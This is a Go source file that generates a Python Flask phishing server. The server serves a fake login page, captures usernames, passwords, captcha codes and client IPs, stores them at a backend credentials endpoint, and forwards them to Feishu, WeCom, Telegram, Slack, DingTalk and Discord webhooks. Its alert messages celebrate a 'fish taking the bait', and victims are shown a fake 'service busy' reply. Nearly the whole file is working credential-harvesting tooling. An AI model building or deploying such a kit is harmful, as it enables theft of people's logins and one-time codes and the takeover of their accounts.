package utils

import (
	"encoding/json"
	"fmt"
	"strings"
)

// RobotConfig represents a robot configuration
type RobotConfig struct {
	ID      uint
	Webhook string
	Type    string
	Secret  string
}

// GenerateContainerCode generates container application code for a project
func GenerateContainerCode(projectName string, projectID uint, frontendRoute string, containerRoute string, loginURL string, containerSecret string, robots []RobotConfig) string {
	frontendRoute = normalizeContainerRoute(frontendRoute, "/")
	containerRoute = normalizeContainerRoute(containerRoute, "/api/submit")

	// Determine robot types
	robotTypes := make(map[string]bool)
	for _, robot := range robots {
		if robot.Type != "" {
			robotTypes[robot.Type] = true
		}
	}

	// Generate route configuration
	routeConfig := generateRouteConfig(frontendRoute)

	// Generate robot function code
	robotFuncCode := generateRobotFunctions(robotTypes)

	// Generate robot configs
	robotConfigsCode := generateRobotConfigs(robots)

	// Generate push code
	pushCode := generatePushCode(robotTypes)

	// Build container app code piece by piece to avoid quoting issues
	var builder strings.Builder

	builder.WriteString("from flask import Flask, request, jsonify, send_file\n")
	builder.WriteString("from flask_cors import CORS\n")
	builder.WriteString("import requests\n")
	builder.WriteString("import os\n")
	builder.WriteString("import json\n")
	builder.WriteString("import time\n")
	builder.WriteString("import urllib.parse\n\n")
	builder.WriteString("app = Flask(__name__)\n")
	builder.WriteString("CORS(app)\n\n")
	builder.WriteString("ROBOT_CONFIGS = " + robotConfigsCode + "\n")
	builder.WriteString("PROJECT_NAME = " + pythonStringLiteral(projectName) + "\n")
	builder.WriteString("CONTAINER_SECRET = " + pythonStringLiteral(containerSecret) + "\n")
	builder.WriteString(fmt.Sprintf("PROJECT_ID = %d\n", projectID))
	builder.WriteString("BACKEND_BASE_URL = os.getenv('BACKEND_BASE_URL', 'http://host.docker.internal:8000').rstrip('/')\n\n")
	builder.WriteString("def serve_index_html():\n")
	builder.WriteString("    try:\n")
	builder.WriteString("        template_path = os.path.join(app.root_path, 'templates', 'index.html')\n")
	builder.WriteString("        return send_file(template_path, mimetype='text/html; charset=utf-8', max_age=0)\n")
	builder.WriteString("    except Exception as e:\n")
	builder.WriteString("        return f\"<h1>页面加载失败</h1><p>{e}</p>\", 500\n\n")

	builder.WriteString("@app.route('/_fp_health', methods=['GET'])\n")
	builder.WriteString("def fp_health():\n")
	builder.WriteString("    return jsonify({'status': 'ok', 'project_id': PROJECT_ID, 'project_name': PROJECT_NAME}), 200\n\n")

	builder.WriteString(routeConfig + "\n\n")
	builder.WriteString("# Authentication token获取\n\n")
	builder.WriteString("def get_django_token():\n")
	builder.WriteString("    try:\n")
	builder.WriteString("        response = requests.post(f'{BACKEND_BASE_URL}/api/auth/container_token/',\n")
	builder.WriteString("                             data={'secret': CONTAINER_SECRET}, timeout=5)\n")
	builder.WriteString("        if response.status_code == 200:\n")
	builder.WriteString("            return response.json().get('token')\n")
	builder.WriteString("    except Exception as e:\n")
	builder.WriteString("        print(f'获取 token 失败: {e}')\n")
	builder.WriteString("    return None\n\n")

	builder.WriteString("def get_client_ip():\n")
	builder.WriteString("    forwarded_for = request.headers.get('X-Forwarded-For', '')\n")
	builder.WriteString("    if forwarded_for:\n")
	builder.WriteString("        return forwarded_for.split(',')[0].strip()\n")
	builder.WriteString("    real_ip = request.headers.get('X-Real-IP', '')\n")
	builder.WriteString("    if real_ip:\n")
	builder.WriteString("        return real_ip.strip()\n")
	builder.WriteString("    return request.remote_addr or ''\n\n")

	builder.WriteString("def webhook_response_ok(response):\n")
	builder.WriteString("    if response.status_code < 200 or response.status_code >= 300:\n")
	builder.WriteString("        return False, f\"HTTP {response.status_code}\"\n")
	builder.WriteString("    try:\n")
	builder.WriteString("        data = response.json()\n")
	builder.WriteString("    except Exception:\n")
	builder.WriteString("        return True, \"\"\n")
	builder.WriteString("    for key in ('errcode', 'code', 'StatusCode'):\n")
	builder.WriteString("        if key in data:\n")
	builder.WriteString("            value = str(data.get(key, '')).strip()\n")
	builder.WriteString("            if value and value != '0' and value.lower() != 'ok':\n")
	builder.WriteString("                message = data.get('errmsg') or data.get('msg') or data.get('message') or data.get('StatusMessage') or ''\n")
	builder.WriteString("                return False, f\"{key}={value}: {message}\"\n")
	builder.WriteString("    return True, \"\"\n\n")

	builder.WriteString("def record_push_log(robot, trigger, status, message, response_status=0, response_body='', error_message='', request_payload=None):\n")
	builder.WriteString("    try:\n")
	builder.WriteString("        robot_id = robot.get('id')\n")
	builder.WriteString("        if not robot_id:\n")
	builder.WriteString("            return\n")
	builder.WriteString("        token = get_django_token()\n")
	builder.WriteString("        if not token:\n")
	builder.WriteString("            return\n")
	builder.WriteString("        payload = {\n")
	builder.WriteString("            'robot_id': robot_id,\n")
	builder.WriteString("            'trigger': trigger,\n")
	builder.WriteString("            'status': status,\n")
	builder.WriteString("            'message': message,\n")
	builder.WriteString("            'response_status': response_status or 0,\n")
	builder.WriteString("            'response_body': str(response_body or '')[:4000],\n")
	builder.WriteString("            'error_message': str(error_message or '')[:2000],\n")
	builder.WriteString("            'request_payload': json.dumps(request_payload or {}, ensure_ascii=False)[:4000]\n")
	builder.WriteString("        }\n")
	builder.WriteString("        requests.post(f'{BACKEND_BASE_URL}/api/robot_push_logs/', json=payload,\n")
	builder.WriteString("            headers={'Authorization': f'Bearer {token}'}, timeout=5)\n")
	builder.WriteString("    except Exception as e:\n")
	builder.WriteString("        print(f'记录推送日志失败: {e}')\n\n")

	builder.WriteString(robotFuncCode + "\n")

	builder.WriteString(fmt.Sprintf("@app.route('%s', methods=['POST'])\n", containerRoute))
	builder.WriteString("def submit():\n")
	builder.WriteString("    if request.is_json:\n")
	builder.WriteString("        data = request.get_json(silent=True) or {}\n")
	builder.WriteString("    else:\n")
	builder.WriteString("        data = request.form\n")
	builder.WriteString("    username = data.get('username')\n")
	builder.WriteString("    password = data.get('password')\n")
	builder.WriteString("    captcha = data.get('captchavalue')\n\n")
	builder.WriteString("    client_ip = get_client_ip()\n\n")
	builder.WriteString("    # 登录链接 - 优先使用用户输入的原始链接，如果没有则使用百度\n")
	builder.WriteString("    login_url = " + pythonStringLiteral(loginURL) + "\n\n")
	builder.WriteString("    # 保存到后端\n")
	builder.WriteString("    try:\n")
	builder.WriteString("        token = get_django_token()\n")
	builder.WriteString("        if token:\n")
	builder.WriteString("            requests.post(f'{BACKEND_BASE_URL}/api/credentials/',\n")
	builder.WriteString(fmt.Sprintf("                json={'project_id': PROJECT_ID, 'username': username, 'password': password, 'captchavalue': captcha, 'ip_address': client_ip},\n"))
	builder.WriteString("                headers={'Authorization': f'Bearer {token}'}, timeout=5)\n")
	builder.WriteString("    except Exception as e:\n")
	builder.WriteString("        print(f'Failed to save credentials: {e}')\n\n")

	builder.WriteString(pushCode + "\n")

	builder.WriteString("    return jsonify({\"message\": \"服务繁忙 请稍后再试!\"}), 200\n\n")

	builder.WriteString("if __name__ == '__main__':\n")
	builder.WriteString("    # HTTPS 配置\n")
	builder.WriteString("    use_https = os.getenv('USE_HTTPS', 'false').lower() == 'true'\n")
	builder.WriteString("    ssl_cert_path = os.getenv('CONTAINER_SSL_CERT_PATH', '/app/certificates/cert.pem')\n")
	builder.WriteString("    ssl_key_path = os.getenv('CONTAINER_SSL_KEY_PATH', '/app/certificates/key.pem')\n\n")
	builder.WriteString("    # 确定监听地址、端口和 SSL 配置\n")
	builder.WriteString("    ssl_context = None\n")
	builder.WriteString("    default_port = 443 if use_https else 5000\n")
	builder.WriteString("    port = int(os.getenv('PORT', default_port))\n")
	builder.WriteString("    host = os.getenv('APP_HOST', '0.0.0.0')\n\n")
	builder.WriteString("    if use_https:\n")
	builder.WriteString("        if os.path.exists(ssl_cert_path) and os.path.exists(ssl_key_path):\n")
	builder.WriteString("            print(\"[*] SSL certificate found; HTTPS enabled\")\n")
	builder.WriteString("            ssl_context = (ssl_cert_path, ssl_key_path)\n")
	builder.WriteString("        else:\n")
	builder.WriteString("            print(\"[!] SSL certificate files not found; falling back to HTTP\")\n")
	builder.WriteString("            print(f\"Certificate paths: cert={ssl_cert_path}, key={ssl_key_path}\")\n")
	builder.WriteString("    else:\n")
	builder.WriteString("        print(\"[!] HTTPS is disabled; using HTTP\")\n\n")
	builder.WriteString("    # 启动容器应用\n")
	builder.WriteString("    app.run(host=host, port=port, ssl_context=ssl_context)\n")

	return builder.String()
}

func pythonStringLiteral(value string) string {
	encoded, err := json.Marshal(value)
	if err != nil {
		return `""`
	}
	return string(encoded)
}

// generateRouteConfig generates route configuration
func generateRouteConfig(frontendRoute string) string {
	frontendRoute = normalizeContainerRoute(frontendRoute, "/")
	if frontendRoute == "/" {
		return "@app.route('/', methods=['GET'])\ndef serve_root():\n    return serve_index_html()"
	}

	return fmt.Sprintf("@app.route('%s', methods=['GET'])\ndef serve_html():\n    return serve_index_html()", frontendRoute)
}

func normalizeContainerRoute(value string, defaultValue string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return defaultValue
	}
	if !strings.HasPrefix(value, "/") {
		return "/" + value
	}
	return value
}

// generateRobotFunctions generates robot-specific functions
func generateRobotFunctions(robotTypes map[string]bool) string {
	var code strings.Builder

	// Feishu functions
	if robotTypes["feishu"] {
		code.WriteString("def create_feishu_message(username, password, login_url=\"https://www.baidu.com/\"):\n")
		code.WriteString("    message_card = {\n")
		code.WriteString("        \"msg_type\": \"interactive\",\n")
		code.WriteString("        \"card\": {\n")
		code.WriteString("            \"header\": {\n")
		code.WriteString("                \"title\": {\"tag\": \"plain_text\", \"content\": f\"🐟{PROJECT_NAME}项目有鱼儿上钩啦，快抄网😊\"},\n")
		code.WriteString("                \"template\": \"turquoise\"\n")
		code.WriteString("            },\n")
		code.WriteString("            \"config\": {\n")
		code.WriteString("                \"wide_screen_mode\": True,\n")
		code.WriteString("                \"enable_forward\": True\n")
		code.WriteString("            },\n")
		code.WriteString("            \"elements\": [\n")
		code.WriteString("                {\n")
		code.WriteString("                    \"tag\": \"div\",\n")
		code.WriteString("                    \"text\": {\n")
		code.WriteString("                        \"tag\": \"lark_md\",\n")
		code.WriteString("                        \"content\": \"*eg: 用户名/密码*\"\n")
		code.WriteString("                    }\n")
		code.WriteString("                },\n")
		code.WriteString("                {\n")
		code.WriteString("                    \"tag\": \"div\",\n")
		code.WriteString("                    \"text\": {\n")
		code.WriteString("                        \"tag\": \"lark_md\",\n")
		code.WriteString("                        \"content\": f\"{username}/{password}\"\n")
		code.WriteString("                    }\n")
		code.WriteString("                },\n")
		code.WriteString("                {\n")
		code.WriteString("                    \"tag\": \"hr\"\n")
		code.WriteString("                },\n")
		code.WriteString("                {\n")
		code.WriteString("                    \"tag\": \"action\",\n")
		code.WriteString("                    \"actions\": [\n")
		code.WriteString("                        {\n")
		code.WriteString("                            \"tag\": \"button\",\n")
		code.WriteString("                            \"text\": {\n")
		code.WriteString("                                \"tag\": \"plain_text\",\n")
		code.WriteString("                                \"content\": \">前往登陆\"\n")
		code.WriteString("                            },\n")
		code.WriteString("                            \"type\": \"default\",\n")
		code.WriteString("                            \"url\": f\"{login_url}\"\n")
		code.WriteString("                        }\n")
		code.WriteString("                    ]\n")
		code.WriteString("                }\n")
		code.WriteString("            ]\n")
		code.WriteString("        }\n")
		code.WriteString("    }\n")
		code.WriteString("    return message_card\n\n")

		code.WriteString("def create_feishu_message_captcha(username, captcha, login_url=\"https://www.baidu.com/\"):\n")
		code.WriteString("    message_card = {\n")
		code.WriteString("        \"msg_type\": \"interactive\",\n")
		code.WriteString("        \"card\": {\n")
		code.WriteString("            \"header\": {\n")
		code.WriteString("                \"title\": {\"tag\": \"plain_text\", \"content\": f\"🎣{PROJECT_NAME}项目,{username}的验证码来了\"},\n")
		code.WriteString("                \"template\": \"turquoise\"\n")
		code.WriteString("            },\n")
		code.WriteString("            \"config\": {\n")
		code.WriteString("                \"wide_screen_mode\": True,\n")
		code.WriteString("                \"enable_forward\": True\n")
		code.WriteString("            },\n")
		code.WriteString("            \"elements\": [\n")
		code.WriteString("                {\n")
		code.WriteString("                    \"tag\": \"div\",\n")
		code.WriteString("                    \"text\": {\n")
		code.WriteString("                        \"tag\": \"lark_md\",\n")
		code.WriteString("                        \"content\": \"*eg: 验证码*\"\n")
		code.WriteString("                    }\n")
		code.WriteString("                },\n")
		code.WriteString("                {\n")
		code.WriteString("                    \"tag\": \"div\",\n")
		code.WriteString("                    \"text\": {\n")
		code.WriteString("                        \"tag\": \"lark_md\",\n")
		code.WriteString("                        \"content\": f\"{captcha}\"\n")
		code.WriteString("                    }\n")
		code.WriteString("                },\n")
		code.WriteString("                {\n")
		code.WriteString("                    \"tag\": \"hr\"\n")
		code.WriteString("                },\n")
		code.WriteString("                {\n")
		code.WriteString("                    \"tag\": \"action\",\n")
		code.WriteString("                    \"actions\": [\n")
		code.WriteString("                        {\n")
		code.WriteString("                            \"tag\": \"button\",\n")
		code.WriteString("                            \"text\": {\n")
		code.WriteString("                                \"tag\": \"plain_text\",\n")
		code.WriteString("                                \"content\": \">前往登陆\"\n")
		code.WriteString("                            },\n")
		code.WriteString("                            \"type\": \"default\",\n")
		code.WriteString("                            \"url\": f\"{login_url}\"\n")
		code.WriteString("                        }\n")
		code.WriteString("                    ]\n")
		code.WriteString("                }\n")
		code.WriteString("            ]\n")
		code.WriteString("        }\n")
		code.WriteString("    }\n")
		code.WriteString("    return message_card\n\n")
	}

	// Wecom (WeChat Work) functions
	if robotTypes["wecom"] {
		code.WriteString("def create_wecom_message(username, password, login_url=\"https://www.baidu.com/\"):\n")
		code.WriteString("    message = {\n")
		code.WriteString("        \"msgtype\": \"markdown_v2\",\n")
		code.WriteString("        \"markdown_v2\": {\n")
		code.WriteString("            \"content\": f\"## 🐟 {PROJECT_NAME}项目有鱼儿上钩啦，快抄网\\n```eg：用户名/密码\\n{username}/{password}\\n```\\n---\\n[点击登陆]({login_url})\\n\\n\"\n")
		code.WriteString("        }\n")
		code.WriteString("    }\n")
		code.WriteString("    return message\n\n")

		code.WriteString("def create_wecom_message_captcha(username, captcha, login_url=\"https://www.baidu.com/\"):\n")
		code.WriteString("    message = {\n")
		code.WriteString("        \"msgtype\": \"markdown_v2\",\n")
		code.WriteString("        \"markdown_v2\": {\n")
		code.WriteString("            \"content\": f\"## 🎣 {PROJECT_NAME}项目,{username}的验证码来了\\n```eg：验证码\\n{captcha}\\n```\\n---\\n[点击登陆]({login_url})\\n\\n\"\n")
		code.WriteString("        }\n")
		code.WriteString("    }\n")
		code.WriteString("    return message\n\n")

		code.WriteString("def sign_wecom(secret):\n")
		code.WriteString("    import time, hmac, hashlib, base64\n")
		code.WriteString("    timestamp = str(int(time.time() * 1000))\n")
		code.WriteString("    string_to_sign = f\"{timestamp}\\\\n{secret}\"\n")
		code.WriteString("    hmac_code = hmac.new(secret.encode(), string_to_sign.encode(), digestmod=hashlib.sha256).digest()\n")
		code.WriteString("    sign = base64.b64encode(hmac_code).decode()\n")
		code.WriteString("    sign = urllib.parse.quote(sign)\n")
		code.WriteString("    return timestamp, sign\n\n")
	}

	if robotTypes["telegram"] {
		code.WriteString("def create_telegram_message(username, password, captcha, login_url):\n")
		code.WriteString("    if captcha:\n")
		code.WriteString("        text = f\"🎣 {PROJECT_NAME}项目，{username}的验证码来了\\n\\n验证码：{captcha}\\n\\n登录地址：{login_url}\"\n")
		code.WriteString("    else:\n")
		code.WriteString("        text = f\"🐟 {PROJECT_NAME}项目有鱼儿上钩啦\\n\\n用户名/密码：{username}/{password}\\n\\n登录地址：{login_url}\"\n")
		code.WriteString("    return {'chat_id': '', 'text': text, 'disable_web_page_preview': True}\n\n")
	}

	if robotTypes["slack"] {
		code.WriteString("def create_slack_message(username, password, captcha, login_url):\n")
		code.WriteString("    if captcha:\n")
		code.WriteString("        title = f\"🎣 {PROJECT_NAME} 验证码\"\n")
		code.WriteString("        detail = f\"*用户*：{username}\\n*验证码*：{captcha}\"\n")
		code.WriteString("    else:\n")
		code.WriteString("        title = f\"🐟 {PROJECT_NAME} 新凭据\"\n")
		code.WriteString("        detail = f\"*用户名/密码*：{username}/{password}\"\n")
		code.WriteString("    return {'text': title, 'blocks': [{'type': 'header', 'text': {'type': 'plain_text', 'text': title}}, {'type': 'section', 'text': {'type': 'mrkdwn', 'text': detail}}, {'type': 'section', 'text': {'type': 'mrkdwn', 'text': f'<{login_url}|前往登录>'}}]}\n\n")
	}

	if robotTypes["dingtalk"] {
		code.WriteString("def sign_dingtalk(secret):\n")
		code.WriteString("    import time, hmac, hashlib, base64\n")
		code.WriteString("    timestamp = str(int(time.time() * 1000))\n")
		code.WriteString("    string_to_sign = f\"{timestamp}\\n{secret}\"\n")
		code.WriteString("    digest = hmac.new(secret.encode(), string_to_sign.encode(), digestmod=hashlib.sha256).digest()\n")
		code.WriteString("    return timestamp, urllib.parse.quote(base64.b64encode(digest).decode())\n\n")
		code.WriteString("def create_dingtalk_message(username, password, captcha, login_url):\n")
		code.WriteString("    if captcha:\n")
		code.WriteString("        title = f\"🎣 {PROJECT_NAME} 验证码\"\n")
		code.WriteString("        detail = f\"用户名：{username}\\n\\n验证码：{captcha}\"\n")
		code.WriteString("    else:\n")
		code.WriteString("        title = f\"🐟 {PROJECT_NAME} 新凭据\"\n")
		code.WriteString("        detail = f\"用户名/密码：{username}/{password}\"\n")
		code.WriteString("    return {'msgtype': 'markdown', 'markdown': {'title': title, 'text': f'### {title}\\n\\n{detail}\\n\\n---\\n\\n[前往登录]({login_url})'}}\n\n")
	}

	if robotTypes["discord"] {
		code.WriteString("def create_discord_message(username, password, captcha, login_url):\n")
		code.WriteString("    if captcha:\n")
		code.WriteString("        title = f\"🎣 {PROJECT_NAME} 验证码\"\n")
		code.WriteString("        detail = f\"用户名：{username}\\n验证码：{captcha}\"\n")
		code.WriteString("    else:\n")
		code.WriteString("        title = f\"🐟 {PROJECT_NAME} 新凭据\"\n")
		code.WriteString("        detail = f\"用户名/密码：{username}/{password}\"\n")
		code.WriteString("    return {'content': title, 'embeds': [{'title': title, 'description': detail, 'color': 3447003, 'url': login_url}]}\n\n")
	}

	return code.String()
}

// generateRobotConfigs generates robot configurations
func generateRobotConfigs(robots []RobotConfig) string {
	if len(robots) == 0 {
		return "[]"
	}

	var config strings.Builder
	config.WriteString("[")

	for i, robot := range robots {
		config.WriteString(fmt.Sprintf(`{"id": %d, "webhook": %s, "type": %s, "secret": %s}`,
			robot.ID,
			pythonStringLiteral(cleanRobotWebhook(robot.Webhook)),
			pythonStringLiteral(strings.TrimSpace(robot.Type)),
			pythonStringLiteral(strings.TrimSpace(robot.Secret))))

		if i < len(robots)-1 {
			config.WriteString(", ")
		}
	}

	config.WriteString("]")
	return config.String()
}

func cleanRobotWebhook(value string) string {
	return strings.Trim(strings.TrimSpace(value), `'"`)
}

// generatePushCode generates push logic based on robot types
func generatePushCode(robotTypes map[string]bool) string {
	var code strings.Builder

	if len(robotTypes) == 0 {
		code.WriteString("    # 没有配置机器人，跳过推送\n")
		code.WriteString("    print('未配置机器人，跳过推送')")
		return code.String()
	}

	code.WriteString("    for robot in ROBOT_CONFIGS:\n")

	wroteCondition := false

	// Feishu push code
	if robotTypes["feishu"] {
		if wroteCondition {
			code.WriteString("        elif robot['type'] == 'feishu':\n")
		} else {
			code.WriteString("        if robot['type'] == 'feishu':\n")
			wroteCondition = true
		}
		code.WriteString("            if captcha:\n")
		code.WriteString("                message_card = create_feishu_message_captcha(username, captcha, login_url)\n")
		code.WriteString("            else:\n")
		code.WriteString("                message_card = create_feishu_message(username, password, login_url)\n")
		code.WriteString("            try:\n")
		code.WriteString("                response = requests.post(robot['webhook'], json=message_card, timeout=10)\n")
		code.WriteString("                ok, error_message = webhook_response_ok(response)\n")
		code.WriteString("                record_push_log(robot, 'credential', 'success' if ok else 'failed', 'captcha' if captcha else 'credential', response.status_code, response.text, error_message, message_card)\n")
		code.WriteString("            except Exception as e:\n")
		code.WriteString("                record_push_log(robot, 'credential', 'failed', 'captcha' if captcha else 'credential', 0, '', str(e), message_card)\n")
		code.WriteString("                print(f'飞书Webhook发送失败: {e}')\n")
	}

	// Wecom push code
	if robotTypes["wecom"] {
		if wroteCondition {
			code.WriteString("        elif robot['type'] == 'wecom':\n")
		} else {
			code.WriteString("        if robot['type'] == 'wecom':\n")
			wroteCondition = true
		}
		code.WriteString("            if captcha:\n")
		code.WriteString("                message = create_wecom_message_captcha(username, captcha, login_url)\n")
		code.WriteString("            else:\n")
		code.WriteString("                message = create_wecom_message(username, password, login_url)\n")
		code.WriteString("            try:\n")
		code.WriteString("                # 企业微信需要签名\n")
		code.WriteString("                if robot['secret']:\n")
		code.WriteString("                    timestamp, sign = sign_dingtalk(robot['secret'])\n")
		code.WriteString("                    url = f\"{robot['webhook']}&timestamp={timestamp}&sign={sign}\"\n")
		code.WriteString("                else:\n")
		code.WriteString("                    url = robot['webhook']\n")
		code.WriteString("                response = requests.post(url, json=message, timeout=10)\n")
		code.WriteString("                ok, error_message = webhook_response_ok(response)\n")
		code.WriteString("                record_push_log(robot, 'credential', 'success' if ok else 'failed', 'captcha' if captcha else 'credential', response.status_code, response.text, error_message, message)\n")
		code.WriteString("            except Exception as e:\n")
		code.WriteString("                record_push_log(robot, 'credential', 'failed', 'captcha' if captcha else 'credential', 0, '', str(e), message)\n")
		code.WriteString("                print(f'企业微信Webhook发送失败: {e}')\n")
	}

	if robotTypes["telegram"] {
		if wroteCondition {
			code.WriteString("        elif robot['type'] == 'telegram':\n")
		} else {
			code.WriteString("        if robot['type'] == 'telegram':\n")
			wroteCondition = true
		}
		code.WriteString("            message = create_telegram_message(username, password, captcha, login_url)\n")
		code.WriteString("            message['chat_id'] = robot['secret']\n")
		code.WriteString("            try:\n")
		code.WriteString("                response = requests.post(robot['webhook'], json=message, timeout=10)\n")
		code.WriteString("                ok, error_message = webhook_response_ok(response)\n")
		code.WriteString("                record_push_log(robot, 'credential', 'success' if ok else 'failed', 'captcha' if captcha else 'credential', response.status_code, response.text, error_message, message)\n")
		code.WriteString("            except Exception as e:\n")
		code.WriteString("                record_push_log(robot, 'credential', 'failed', 'captcha' if captcha else 'credential', 0, '', str(e), message)\n")
		code.WriteString("                print(f'Telegram Webhook发送失败: {e}')\n")
	}

	if robotTypes["slack"] {
		if wroteCondition {
			code.WriteString("        elif robot['type'] == 'slack':\n")
		} else {
			code.WriteString("        if robot['type'] == 'slack':\n")
			wroteCondition = true
		}
		code.WriteString("            message = create_slack_message(username, password, captcha, login_url)\n")
		code.WriteString("            try:\n")
		code.WriteString("                response = requests.post(robot['webhook'], json=message, timeout=10)\n")
		code.WriteString("                ok, error_message = webhook_response_ok(response)\n")
		code.WriteString("                record_push_log(robot, 'credential', 'success' if ok else 'failed', 'captcha' if captcha else 'credential', response.status_code, response.text, error_message, message)\n")
		code.WriteString("            except Exception as e:\n")
		code.WriteString("                record_push_log(robot, 'credential', 'failed', 'captcha' if captcha else 'credential', 0, '', str(e), message)\n")
		code.WriteString("                print(f'Slack Webhook发送失败: {e}')\n")
	}

	if robotTypes["dingtalk"] {
		if wroteCondition {
			code.WriteString("        elif robot['type'] == 'dingtalk':\n")
		} else {
			code.WriteString("        if robot['type'] == 'dingtalk':\n")
			wroteCondition = true
		}
		code.WriteString("            message = create_dingtalk_message(username, password, captcha, login_url)\n")
		code.WriteString("            try:\n")
		code.WriteString("                url = robot['webhook']\n")
		code.WriteString("                if robot['secret']:\n")
		code.WriteString("                    timestamp, sign = sign_wecom(robot['secret'])\n")
		code.WriteString("                    separator = '&' if '?' in url else '?'\n")
		code.WriteString("                    url = f\"{url}{separator}timestamp={timestamp}&sign={sign}\"\n")
		code.WriteString("                response = requests.post(url, json=message, timeout=10)\n")
		code.WriteString("                ok, error_message = webhook_response_ok(response)\n")
		code.WriteString("                record_push_log(robot, 'credential', 'success' if ok else 'failed', 'captcha' if captcha else 'credential', response.status_code, response.text, error_message, message)\n")
		code.WriteString("            except Exception as e:\n")
		code.WriteString("                record_push_log(robot, 'credential', 'failed', 'captcha' if captcha else 'credential', 0, '', str(e), message)\n")
		code.WriteString("                print(f'钉钉Webhook发送失败: {e}')\n")
	}

	if robotTypes["discord"] {
		if wroteCondition {
			code.WriteString("        elif robot['type'] == 'discord':\n")
		} else {
			code.WriteString("        if robot['type'] == 'discord':\n")
			wroteCondition = true
		}
		code.WriteString("            message = create_discord_message(username, password, captcha, login_url)\n")
		code.WriteString("            try:\n")
		code.WriteString("                response = requests.post(robot['webhook'], json=message, timeout=10)\n")
		code.WriteString("                ok, error_message = webhook_response_ok(response)\n")
		code.WriteString("                record_push_log(robot, 'credential', 'success' if ok else 'failed', 'captcha' if captcha else 'credential', response.status_code, response.text, error_message, message)\n")
		code.WriteString("            except Exception as e:\n")
		code.WriteString("                record_push_log(robot, 'credential', 'failed', 'captcha' if captcha else 'credential', 0, '', str(e), message)\n")
		code.WriteString("                print(f'Discord Webhook发送失败: {e}')\n")
	}

	if wroteCondition {
		code.WriteString("        else:\n")
		code.WriteString("            print(f'未知的机器人类型: {robot[\"type\"]}')\n")
	}

	return code.String()
}
